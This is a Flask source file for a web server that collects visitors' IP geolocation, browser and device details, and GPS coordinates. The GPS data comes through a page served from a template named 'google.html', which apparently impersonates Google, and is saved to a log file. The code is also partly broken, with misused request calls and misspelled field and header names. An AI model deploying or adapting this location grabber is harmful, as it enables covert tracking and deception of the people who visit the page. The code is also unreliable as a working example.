from flask import Flask, render_template, request, jsonify, session
import requests
import json
from user_agents import parse 



app = Flask(__name__, template_folder='.site', static_folder='.site', static_url_path='/')
app.secret_key = 'xxx'



def ip(ip):
    url = "http://ip-api.com/json/"
    info = requests.get(url, ip)
    return info



@app.route('/', methods=['POST', 'GET'])
def index():
    #this ip server info
    url ='http://ip-api.com/json/'
    user_ip = request.remote_addr
    y ='?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,quey'
    main = requests.post(url, user_ip, y)
    data = main.json()
    #devise info
    
    
    user_agent = parse(request.headers.get('user_agent'))
    str(user_agent)
    xyz = {
            "browser": user_agent.browser,
            "os": user_agent.os,
            "devise": user_agent.device,
            } 
    user = json.dumps(xyz)


    return render_template("index.html", main=data, user=user)



  



@app.route('/gps')
def gps():
    
    xyz = {
        'ip': request.remote_addr,
        'user_agent': request.user_agent.string,
        'browser': request.user_agent.browser,
        'version': request.user_agent.version,
        'platform': request.user_agent.platform,  # This will give you the OS
        'accept_languages': request.accept_languages,
        'accept_encodings': request.accept_encodings,
        'accept_charsets': request.accept_charsets,
                } 
    session['d'] = json.dumps(xyz)
    return render_template('temp/google.html')




@app.route('/admin')
def admin():
    return render_template('admin.html')


@app.route('/get-gps-info', methods=['POST', 'GET'])
def get_gps_info():
    gps_info = request.get_json()
    session['loc'] = request.get_json()
    print(gps_info)
    with open('gpslog.json', 'w') as file:
        file.write(f"{gps_info}")

    return jsonify(gps_info)




if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=8080)
